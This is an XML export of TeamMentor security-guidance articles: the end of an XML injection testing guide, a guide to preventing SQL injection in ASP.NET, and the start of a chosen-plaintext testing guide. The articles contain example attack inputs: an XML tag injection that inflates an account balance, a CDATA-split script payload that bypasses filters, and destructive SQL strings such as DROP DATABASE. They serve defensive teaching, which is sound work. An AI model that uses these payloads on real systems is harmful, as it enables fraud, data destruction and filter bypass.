addition, you must tune your test case data in order to execute additional XML Injection payloads. </p><h2><em>Consider string format and encoding according to entry point</em></h2><p><strong><em>Web Forms</em></strong></p><p><strong><em></em></strong>Web forms are the easiest to test since they commonly allow most ASCII strings.&nbsp; An attacker can try entering this string into an input field, for instance in the web form below:</p>
<p><img src="X:\Trash\GE\clip_image001.png"></p><p>An attacker might try to enter this string in the email text field to execute an XML injection attack:</p><pre>JohnyC@examplesite.com&lt;/mail&gt;&lt;account type="savings"&gt;&lt;created&gt;03-02-2008&lt;/created&gt;&lt;number&gt;12345678&lt;/number&gt;&lt;balance&gt;1000000&lt;/balance&gt;&lt;/account&gt;</pre><p>It’s possible that client side checks are in place to match the contents of this text field with a valid email format.&nbsp; However, client side checks are easily bypassed by removing them at the attacker’s end.</p><p>&nbsp;</p><p><strong><em>URL Contents</em></strong></p><p><strong><em></em></strong><br>The format of URLs tends to be more complex than that of other input fields.&nbsp; This is due to the need for URLs to contain special or reserved characters, such as spaces, questions marks, single quotes, less than/greater than (&lt;/&gt;) symbols, and ampersands as data, rather than URL directives.&nbsp; The client <em>encodes</em> the URL and then sends it to the server, which decodes it so that the special characters can be processed as data.</p><p>How the encoding and decoding is done depends on the programming language in use.&nbsp; For example, sometimes the encoding function replaces the blank spaces with a plus (+) sign, or the characters %20, so that:</p><pre>Joseph Cohen</pre><p>Becomes:</p><pre>Joseph+Cohen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </pre><p>or<strong></strong></p><pre>Joseph%20Cohen</pre><p>The most common URL encoding scheme consists of replacing special and reserved characters with a percent sign and then their hexadecimal values (e.g. <strong>%HH</strong>.)&nbsp; Using this encoding scheme the URL seen below will be translated from:</p><pre><strong>http://www.examplesite.com/CreateChecking.php?username=JohnyC&amp;password=qwerty&amp;email=JohnyC@examplesite.com&lt;/mail&gt;&lt;account type="savings"&gt;&lt;created&gt;03-02-2008&lt;/created&gt;&lt;number&gt;12345678&lt;/number&gt;&lt;balance&gt;1000000&lt;/balance&gt;&lt;/account&gt;</strong></pre><pre><strong></strong></pre><pre>to: &nbsp;</pre><pre><strong>http://www.examplesite.com/CreateChecking.php?username=JohnyC&amp;password=qwerty&amp;email=JohnyC%40examplesite.com%3c%2fmail%3e%3caccount%20type%3d%22savings%22%3e%3ccreated%3e03-02-2008%3c%2fcreated%3e%3cnumber%3e12345678%3c %2fnumber%3e%3cbalance%3e1000000%3c%2fbalance%3e%3c%2faccount%3e</strong></pre><pre><strong></strong></pre><p>This is because the below characters translate to their hex encoding like this:</p><p>&nbsp;</p><div><table><tbody><tr><td><p><strong>space</strong></p></td><td><p>@</p></td><td><p><strong>&lt;&nbsp;</strong></p></td><td><p>/</p></td><td><p>&gt;&nbsp;</p></td><td><p>=</p></td><td><p><strong>"</strong></p></td></tr><tr><td><p><strong>%20</strong></p></td><td><p><strong>%40</strong></p></td><td><p><strong>%3c</strong></p></td><td><p><strong>%2f</strong></p></td><td><p><strong>%3e</strong></p></td><td><p><strong>%3d</strong></p></td><td><p><strong>%22</strong></p></td></tr></tbody></table></div><p>&nbsp;</p><p><strong><em>Flash Parameters</em></strong></p><p>Flash uses the <strong>FlashVars </strong>parameter tag from HTML embedded objects to collect user input:<strong></strong></p><pre>&lt;object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"</pre><pre> codebase=""http://macromedia.com/cabs/swflash.cab#version=6,0,0,0""</pre><pre> width="250" height="250" id="flaMovie1" align="center"&gt;</pre><pre> &lt;param name=movie value="flaMovie1.swf"&gt;</pre><pre> &lt;param name=FlashVars value="input=userInput"&gt; </pre><pre>&nbsp;&lt;param name=quality value=high&gt; </pre><pre>&lt;/object&gt;</pre><pre><strong>&nbsp;</strong></pre><p>When testing through <strong>FlashVars </strong>you need to replace the <strong>userInput </strong>value with the XML injection string.&nbsp; </p><p>Note: Make sure that you also try different encodings when you test through this entry point.</p><p><strong><em>&nbsp;</em></strong></p><p><strong><em>XML store contents</em></strong></p><p><strong><em></em></strong></p><p>You must also tune your test case data when modifying the CDATA tag within XML files to execute a successful XSS attack.&nbsp; For instance, some applications may blacklist any input that contains the following string, thus not allowing it to be placed in the XML data store:&nbsp;</p><pre>&lt;script&gt; </pre><br><p>Here you may need to tweak your attack data to hide the script tags by adding extra CDATA tags<strong><em>:&nbsp;</em></strong><strong><em>&nbsp;</em></strong></p><pre>&lt;data&gt;&lt;[CDATA[&lt;sc]]&gt;&lt;![CDATA[ript&gt;alert('XSS')&lt;/sc]]&gt;&lt;![CDATA[ript&gt;]]&gt;&lt;/data&gt;</pre><p><strong><em></em></strong></p><p>At the end the contents within the CDATA tags get concatenated to construct a valid &lt;script&gt; tag.&nbsp; This will bypass any checks done for <strong>&lt;script&gt;</strong> before the final concatenation.<strong><em></em></strong></p><p><strong><em></em></strong>&nbsp;</p><p><strong><em>Additional entry points</em></strong><strong><em>&nbsp;</em></strong></p><p>Each application will have different ways of processing input from users, files, services, and other software entities.&nbsp; Ensure that you understand the format of each entry point and cover the different formats on each entry point for each high risk component.<strong><em></em></strong></p><p><strong><em>&nbsp;</em></strong></p><h2><em>Try additional payloads</em></h2><p>So far you’ve learned how to execute two payloads:</p><ul><li>Tag injection. </li><li>Cross-site scripting through CDATA tags.</li></ul><p>There are other payloads that you can try such as:</p><ul><li>Denial of service by consuming extra memory with excessive tags. </li><li>Denial of service by resource exhaustion via recursive elements. </li><li>Information disclosure attacks using XML External Entities (XEE)<a href="about:blank#_edn4" name="_ednref4">[iv]</a></li></ul><p>Each payload will require special tweaking of the XML attack data and might add new entry points to the scenario.&nbsp; However, it is imperative that you keep up to date with the latest attack techniques related to XML injection and include them in your security test suite.</p><p>&nbsp;</p><h1>Conclusions</h1><p>Testing for XML injection requires that you understand how the application under test uses XML.&nbsp; There are different scenarios ranging from when systems take XML as input, to when systems respond with XML as HTML output.&nbsp; To successfully test for XML injection you need to understand these different scenarios.&nbsp; Then, familiarize yourself with any potentially dangerous code and characteristics of any high risk components that are present.&nbsp; Create a test plan that matches high risk components with their different entry points.&nbsp; Then, start testing with simple test strings and observe how the application responds.&nbsp; Finally, to achieve the most complete coverage, ensure that you tune your attack data to cover all formats in all entry points, and try different, up to date payloads.</p><p>&nbsp;</p><div><br></div><div><hr></div><p><a href="about:blank#_ednref1" name="_edn1">[i]</a>Programming Web Services with SOAP.&nbsp; James Snell, Doug Tidwell &amp; Pavel Kulchenko.&nbsp; <a href="http://www.topxml.com/soap/articles/webservices/default.asp">http://www.topxml.com/soap/articles/webservices/default.asp</a></p><p><a href="about:blank#_ednref2" name="_edn2">[ii]</a> XML Web Services Basics.&nbsp; Roger Wolter.&nbsp; Microsoft Corporation.&nbsp; <a href="http://msdn2.microsoft.com/en-us/library/ms996507.aspx">http://msdn2.microsoft.com/en-us/library/ms996507.aspx</a></p><p><a href="about:blank#_ednref3" name="_edn3">[iii]</a> Document Type Definition.&nbsp; Wikipedia.&nbsp; <a href="http://en.wikipedia.org/wiki/Document_Type_Definition">http://en.wikipedia.org/wiki/Document_Type_Definition</a></p><p><a href="about:blank#_ednref4" name="_edn4">[iv]</a> Testing for XML Injection. OWASP. <a href="http://www.owasp.org/index.php/Testing_for_XML_Injection">http://www.owasp.org/index.php/Testing_for_XML_Injection</a></p><p>&nbsp;</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1152373269" Content_Hash="1617189997">
    <Metadata>
      <Id>d1220cc3-7aef-472d-92de-182218c05c93</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Protect From SQL Injection in ASP.NET</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Summary</h1><p>This How to shows a number of ways to help protect your ASP.NET application from SQL injection attacks. SQL injection can occur when an application uses input to construct dynamic SQL statements or when it uses stored procedures to connect to the database. Conventional security measures, such as the use of SSL and IPSec, do not protect your application from SQL injection attacks. Successful SQL injection attacks enable malicious users to execute commands in an application's database.</p><p>Countermeasures include using a list of acceptable characters to constrain input, using parameterized SQL for data access, and using a least privileged account that has restricted permissions in the database. Using stored procedures with parameterized SQL is the recommended approach because SQL parameters are type safe. Type-safe SQL parameters can also be used with dynamic SQL. In situations where parameterized SQL cannot be used, consider using character escaping techniques. </p><h1>Contents</h1><ul><li><div>Objectives</div></li><li><div>Overview</div></li><li><div>Summary of Steps</div></li><li><div>Step 1. Constrain Input</div></li><li><div>Step 2. Use Parameters with Stored Procedures</div></li><li><div>Step 3. Use Parameters with Dynamic SQL</div></li><li><div>Additional Considerations</div></li><li><div>Additional Resources</div></li></ul><h1>Objectives</h1><ul><li>Learn how SQL injection attacks work. </li><li>Constrain input to prevent SQL injection. </li><li>Use type safe SQL command parameters to prevent SQL injection. </li><li>Use a least privileged account to connect to the database. </li><li>Learn additional countermeasures to further reduce risk. </li></ul><h1>Overview</h1><p>A successful SQL injection attack enables a malicious user to execute commands in your application's database by using the privileges granted to your application's login. The problem is more severe if your application uses an over-privileged account to connect to the database. For example, if your application's login has privileges to eliminate a database, then without adequate safeguards, an attacker might be able to perform this operation.</p><p>Common vulnerabilities that make your data access code susceptible to SQL injection attacks include: </p><ul><li>Weak input validation. </li><li>Dynamic construction of SQL statements without the use of type-safe parameters. </li><li>Use of over-privileged database logins. </li></ul><h2>SQL Injection Example</h2><p>Consider what happens when a user types the following string in the <strong>SSN</strong> text box, which is expecting a Social Security number of the form <em>nnn-nn-nnnn</em>.</p><div><pre>' ; DROP DATABASE pubs  --  </pre></div><p>Using the input, the application executes the following dynamic SQL statement or stored procedure, which internally executes a similar SQL statement. </p><div><pre>// Use dynamic SQL<br>SqlDataAdapter myCommand = new SqlDataAdapter(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SELECT au_lname, au_fname FROM authors WHERE au_id = '" + <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SSN.Text + "'", myConnection);</pre></div><pre>// Use stored procedures<br>SqlDataAdapter myCommand = new SqlDataAdapter(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "LoginStoredProcedure '" + <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SSN.Text + "'", myConnection);<br></pre><p>The developer's intention was that when the code runs, it inserts the user's input and generates a SQL the following statement.</p><div><pre>SELECT au_lname, au_fname FROM authors WHERE au_id = '172-32-9999'  </pre></div><p>However, the code inserts the user's malicious input and generates the following query.</p><div><pre>SELECT au_lname, au_fname FROM authors WHERE au_id = ''; DROP DATABASE pubs --'  </pre></div><p>In this case, the <strong>'</strong> (single quotation mark) character that starts the rogue input terminates the current string literal in the SQL statement. It closes the current statement only if the following parsed token does not make sense as a continuation of the current statement but does make sense as the start of a new statement. As a result, the opening single quotation mark character of the rogue input results in the following statement.</p><div><pre>SELECT au_lname, au_fname FROM authors WHERE au_id = ''  </pre></div><p>The<strong>;</strong> (semicolon) character tells SQL that this is the end of the current statement, which is then followed by the following malicious SQL code.</p><div><div><div></div><div><a class="copyCode" href="javascript:CopyCode('ctl00_LibFrame_ctl09');"></a>&nbsp;</div></div><pre>; DROP DATABASE pubs  </pre></div><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;The semicolon is not necessarily required to separate SQL statements. This is dependent on vendor or implementation, but Microsoft SQL Server does not require them. For example, SQL Server parses the following as two separate statements:</blockquote><blockquote>SELECT * FROM MyTable DELETE FROM MyTable</blockquote><blockquote></blockquote><p>Finally, the <strong>--</strong> (double dash) sequence of characters is a SQL comment that tells SQL to ignore the rest of the text. In this case, SQL ignores the closing <strong>'</strong> (single quotation mark) character, which would otherwise cause a SQL parser error.</p><div><pre>--'  </pre></div><h2>Guidelines</h2><p>To counter SQL injection attacks, you need to: </p><ul><li><strong>Constrain and sanitize input data. </strong>Check for known good data by validating for type, length, format, and range. </li><li><strong>Use type-safe SQL parameters for data access.</strong> You can use these parameters with stored procedures or dynamically constructed SQL command strings. Parameter collections such as <strong>SqlParameterCollection</strong> provide type checking and length validation. If you use a parameters collection, input is treated as a literal value, and SQL Server does not treat it as executable code. An additional benefit of using a parameters collection is that you can enforce type and length checks. Values outside of the range trigger an exception. This is a good example of defense in depth. </li><li><strong>Use an account that has restricted permissions in the database.</strong> Ideally, you should only grant execute permissions to selected stored procedures in the database and provide no direct table access. </li><li><strong>Avoid disclosing database error information. </strong>In the event of database errors, make sure you do not disclose detailed error messages to the user. </li></ul><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;Conventional security measures, such as the use of Secure Socket Layer (SSL) and IP Security (IPSec), do not protect your application from SQL injection attacks. </blockquote><h1>Summary of Steps</h1><p>To protect your application from SQL injection, perform the following steps: </p><ul><li>Step 1. Constrain input. </li><li>Step 2. Use parameters with stored procedures. </li><li>Step 3. Use parameters with dynamic SQL.<strong> </strong></li></ul><h1>Step 1. Constrain Input</h1><p>You should validate all input to your ASP.NET applications for type, length, format, and range. By constraining the input used in your data access queries, you can protect your application from SQL injection. </p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;When constraining input, it is a good practice to create a list of acceptable characters and use regular expressions to reject any characters that are not on the list. The potential risk associated with using a list of unacceptable characters is that it is always possible to overlook an unacceptable character when defining the list; also, an unacceptable character can be represented in an alternate format to pass validation. </blockquote><h2>Constrain Input in ASP.NET Web Pages</h2><p>Start by constraining input in the server-side code for your ASP.NET Web pages. Do not rely on client-side validation because it can be easily bypassed. Use client-side validation only to reduce round trips and to improve the user experience.</p><p>If you use server controls, use the ASP.NET validator controls, such as the <strong>RegularExpressionValidator</strong> and <strong>RangeValidator</strong> controls to constrain input. If you use regular HTML input controls, use the <strong>Regex</strong> class in your server-side code to constrain input.</p><p>If in the previous code example, the SSN value is captured by an ASP.NET <strong>TextBox</strong> control, you can constrain its input by using a <strong>RegularExpressionValidator</strong> control as shown in the following.</p><div><pre>&lt;%@ language="C#" %&gt;<br>&lt;form id="form1" runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID="SSN" runat="server"/&gt;<br>&nbsp;&nbsp;&nbsp; &lt;asp:RegularExpressionValidator ID="regexpSSN" runat="server"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ErrorMessage="Incorrect SSN Number" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ControlToValidate="SSN"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ValidationExpression="^\d{3}-\d{2}-\d{4}$" /&gt;<br>&lt;/form&gt;  </pre></div><p>If the SSN input is from another source, such as an HTML control, a query string parameter, or a cookie, you can constrain it by using the <strong>Regex</strong> class from the <strong>System.Text.RegularExpressions</strong> namespace. The following example assumes that the input is obtained from a cookie.</p><p>using System.Text.RegularExpressions;</p><div><pre>if (Regex.IsMatch(Request.Cookies["SSN"], "^\d{3}-\d{2}-\d{4}$"))<br>{<br>&nbsp;&nbsp;&nbsp; // access the database<br>}<br>else<br>{<br>&nbsp;&nbsp;&nbsp; // handle the bad input<br>}  </pre></div><h2>Constrain Input in Data Access Code</h2><p>In some situations, you need to provide validation in your data access code, perhaps in addition to your ASP.NET page-level validation. Two common situations where you need to provide validation in your data access code are: </p><ul><li><strong>Untrusted clients.</strong> If the data can come from an untrusted source or you cannot guarantee how well the data has been validated and constrained, add validation logic that constrains input to your data access routines. </li><li><strong>Library code. </strong>If your data access code is packaged as a library designed for use by multiple applications, your data access code should perform its own validation, because you can make no safe assumptions about the client applications. </li></ul><p>The following example shows how a data access routine can validate its input parameters by using regular expressions prior to using the parameters in a SQL statement.</p><div><pre>using System;<br>using System.Text.RegularExpressions;</pre></div><pre>public void CreateNewUserAccount(string name, string password)<br>{<br>&nbsp;&nbsp;&nbsp; // Check name contains only lower case or upper case letters, <br>&nbsp;&nbsp;&nbsp; // the apostrophe, a dot, or white space. Also check it is <br>&nbsp;&nbsp;&nbsp; // between 1 and 40 characters long<br>&nbsp;&nbsp;&nbsp; if ( !Regex.IsMatch(userIDTxt.Text, @"^[a-zA-Z'./s]{1,40}$"))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw new FormatException("Invalid name format");</pre><pre>&nbsp;</pre><pre>&nbsp;&nbsp;&nbsp; // Check password contains at least one digit, one lower case <br>&nbsp;&nbsp;&nbsp; // letter, one uppercase letter, and is between 8 and 10 <br>&nbsp;&nbsp;&nbsp; // characters long<br>&nbsp;&nbsp;&nbsp; if ( !Regex.IsMatch(passwordTxt.Text, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @"^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$" ))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw new FormatException("Invalid password format");</pre><pre>&nbsp;</pre><pre>&nbsp;&nbsp;&nbsp; // Perform data access logic (using type safe parameters)<br>&nbsp;&nbsp;&nbsp; ...<br>}</pre><h1>Step 2. Use Parameters with Stored Procedures</h1><p>Using stored procedures does not necessarily prevent SQL injection. The important thing to do is use parameters with stored procedures. If you do not use parameters, your stored procedures can be susceptible to SQL injection if they use unfiltered input as described in the "Overview" section of this document.</p><p>The following code shows how to use <strong>SqlParameterCollection</strong> when calling a stored procedure.</p><div><pre>using System.Data;<br>using System.Data.SqlClient;</pre><pre>using (SqlConnection connection = new SqlConnection(connectionString))<br>{<br>&nbsp; DataSet userDataset = new DataSet();<br>&nbsp; SqlDataAdapter myCommand = new SqlDataAdapter( <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "LoginStoredProcedure", connection);<br>&nbsp; myCommand.SelectCommand.CommandType = CommandType.StoredProcedure;<br>&nbsp; myCommand.SelectCommand.Parameters.Add("@au_id", SqlDbType.VarChar, 11);<br>&nbsp; myCommand.SelectCommand.Parameters["@au_id"].Value = SSN.Text;</pre><pre>&nbsp; myCommand.Fill(userDataset);<br>}  </pre></div><p>In this case, the <strong>@au_id</strong> parameter is treated as a literal value and not as executable code. Also, the parameter is checked for type and length. In the preceding code example, the input value cannot be longer than 11 characters. If the data does not conform to the type or length defined by the parameter, the <strong>SqlParameter</strong> class throws an exception.</p><h2>Review Your Application's Use of Parameterized Stored Procedures</h2><p>Because using stored procedures with parameters does not necessarily prevent SQL injection, you should review your application's use of this type of stored procedure. For example, the following parameterized stored procedure has several security vulnerabilities.</p><div><pre>CREATE PROCEDURE dbo.RunQuery@var ntextAS<br>        exec sp_executesql @varGO  </pre></div><p>An application that uses a stored procedure similar to the one in the preceding code example has the following vulnerabilities: </p><ul><li>The stored procedure executes whatever statement is passed to it. Consider the <strong>@var</strong> variable being set to: <div><pre>DROP TABLE ORDERS;  </pre></div><p>In this case, the ORDERS table will be dropped. </p></li><li>The stored procedure runs with <strong>dbo</strong> privileges. </li><li>The stored procedure's name (<strong>RunQuery</strong>) is a poor choice. If an attacker is able to probe the database, he or she will see the name of the stored procedure. With a name like <strong>RunQuery</strong>, he can guess that the stored procedure is likely to run the supplied query. </li></ul><h1>Step 3. Use Parameters with Dynamic SQL</h1><p>If you cannot use stored procedures, you should still use parameters when constructing dynamic SQL statements. The following code shows how to use <strong>SqlParametersCollection</strong> with dynamic SQL.</p><div><pre>using System.Data;<br>using System.Data.SqlClient;</pre></div><pre>using (SqlConnection connection = new SqlConnection(connectionString))<br>{<br>&nbsp; DataSet userDataset = new DataSet();<br>&nbsp; SqlDataAdapter myDataAdapter = new SqlDataAdapter(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SELECT au_lname, au_fname FROM Authors WHERE au_id = @au_id", <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connection);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp; myCommand.SelectCommand.Parameters.Add("@au_id", SqlDbType.VarChar, 11);<br>&nbsp; myCommand.SelectCommand.Parameters["@au_id"].Value = SSN.Text;<br>&nbsp; myDataAdapter.Fill(userDataset);<br>}</pre><h2>Using Parameter Batching</h2><p>A common misconception is that if you concatenate several SQL statements to send a batch of statements to the server in a single round trip, you cannot use parameters. However, you can use this technique if you make sure that parameter names are not repeated. You can easily do this by making sure that you use unique parameter names during SQL text concatenation, as shown here.</p><div><pre>using System.Data;<br>using System.Data.SqlClient;<br>. . .<br>using (SqlConnection connection = new SqlConnection(connectionString))<br>{<br>&nbsp; SqlDataAdapter dataAdapter = new SqlDataAdapter(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "SELECT CustomerID INTO #Temp1 FROM Customers " +<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "WHERE CustomerID &gt; @custIDParm; SELECT CompanyName FROM Customers " +<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "WHERE Country = @countryParm and CustomerID IN " +<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "(SELECT CustomerID FROM #Temp1);",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connection);<br>&nbsp; SqlParameter custIDParm = dataAdapter.SelectCommand.Parameters.Add(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "@custIDParm", SqlDbType.NChar, 5);<br>&nbsp; custIDParm.Value = customerID.Text;</pre><pre>&nbsp; SqlParameter countryParm = dataAdapter.SelectCommand.Parameters.Add(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "@countryParm", SqlDbType.NVarChar, 15);<br>&nbsp; countryParm.Value = country.Text;</pre><pre>&nbsp; connection.Open();<br>&nbsp; DataSet dataSet = new DataSet();<br>&nbsp; dataAdapter.Fill(dataSet);<br>}<br>. . .  </pre></div><h1>Additional Considerations</h1><p>Other things to consider when you develop countermeasures to prevent SQL injection include: </p><ul><li>Use escape routines to handle special input characters. </li><li>Use a least-privileged database account. </li><li>Avoid disclosing error information. </li></ul><h2>Use Escape Routines to Handle Special Input Characters</h2><p>In situations where parameterized SQL cannot be used and you are forced to use dynamic SQL instead, you need to safeguard against input characters that have special meaning to SQL Server (such as the single quote character). If not handled, special characters such as the single quote character in the input can be utilized to cause SQL injection. </p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;Special input characters pose a threat only with dynamic SQL and not when using parameterized SQL. </blockquote><p>Escape routines add an escape character to characters that have special meaning to SQL Server, thereby making them harmless. This is illustrated in the following code fragment:</p><div><pre>private string SafeSqlLiteral(string inputSQL){  return inputSQL.Replace("'", "''");</pre></div><p>}</p><h2>Use a Least-Privileged Database Account</h2><p>Your application should connect to the database by using a least-privileged account. If you use Windows authentication to connect, the Windows account should be least-privileged from an operating system perspective and should have limited privileges and limited ability to access Windows resources. Additionally, whether or not you use Windows authentication or SQL authentication, the corresponding SQL Server login should be restricted by permissions in the database.</p><p>Consider the example of an ASP.NET application running on Microsoft Windows Server 2003 that accesses a database on a different server in the same domain. By default, the ASP.NET application runs in an application pool that runs under the Network Service account. This account is a least privileged account.</p><h3>To access SQL Server with the Network Service account </h3><ol><li>Create a SQL Server login for the Web server's Network Service account. The Network Service account has network credentials that are presented at the database server as the identity <em>DOMAIN</em>\<em>WEBSERVERNAME</em>$. For example, if your domain is called XYZ and the Web server is called 123, you create a database login for XYZ\123$. </li><li>Grant the new login access to the required database by creating a database user and adding the user to a database role. </li><li>Establish permissions to let this database role call the required stored procedures or access the required tables in the database. Only grant access to stored procedures the application needs to use, and only grant sufficient access to tables based on the application's minimum requirements. <p>For example, if the ASP.NET application only performs database lookups and does not update any data, you only need to grant read access to the tables. This limits the damage that an attacker can cause if the attacker succeeds in a SQL injection attack. </p></li></ol><h2>Avoid Disclosing Error Information</h2><p>Use structured exception handling to catch errors and prevent them from propagating back to the client. Log detailed error information locally, but return limited error details to the client. </p><p>If errors occur while the user is connecting to the database, be sure that you provide only limited information about the nature of the error to the user. If you disclose information related to data access and database errors, you could provide a malicious user with useful information that he or she can use to compromise your database security. Attackers use the information in detailed error messages to help deconstruct a SQL query that they are trying to inject with malicious code. A detailed error message may reveal valuable information such as the connection string, SQL server name, or table and database naming conventions.</p><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="634455651" Content_Hash="1934162477">
    <Metadata>
      <Id>ee32405c-c256-4003-a4a1-d390369d4609</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for Chosen Plaintext Bugs</Title>
      <Category>Cryptography</Category>
      <Phase>Test</Phase>
      <Technology> Any</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Public and private key encryption algorithms</li></ul><h1>Summary</h1><p>The adversary's ideal goal when attacking cryptographic systems is to recover the cryptographic key or to decipher specific encrypted information.&nbsp;In the ideal case, a remote adversary can only sniff the encrypted packets; they can';t manipulate either the text before encryption (plaintext) or the text after encryption (ciphertext).&nbsp;A chosen plaintext bug allows adversaries to choose any particular plaintext they want. The adversary tricks the victim in to encrypting their own plaintext (<em>P</em>) and gathers useful information from the resulting ciphertext (<em>C</em>).&nbsp; &nbsp;&nbsp;</p><p>The following steps are recommended to test for chosen plaintext bugs:</p><ul><li>Step 1:&nbsp; Understand Attack Scenarios </li><li>Step 2:&nbsp; Analyze Root Causes and Mitigations </li><li>Step 3:&nbsp; Start Testing and Exploring </li><li>Step 4:&nbsp; Tune Test Cases</li></ul><h1>Step 1:&nbsp; Understand Attack Scenarios</h1><p>First, you need to understand the details of chosen plaintext attacks. The basic concept of a chosen plaintext attack is really simple: an attacker chooses <em>plaintext</em> to feed the encryption algorithm they want to break.&nbsp;There are two scenarios associated with this kind of bug:</p><ul><li>Scenario 1:&nbsp; Batched or offline chosen plaintext attack </li><li>Scenario 2:&nbsp; Adaptive or online chosen plaintext attack&nbsp;&nbsp; </li></ul><h2>Scenario 1:&nbsp; Batched or offline chosen plaintext attack</h2><p>In the batched scenario, the attacker possesses all of the plaintext beforehand (prior to launching the attack and obtaining any ciphertext).&nbsp;The attacker then encrypts the plaintext with the encryption system in question, finally obtaining the corresponding ciphertext.&nbsp;This attack is commonly used in attempting to brute-force the private key of the encryption 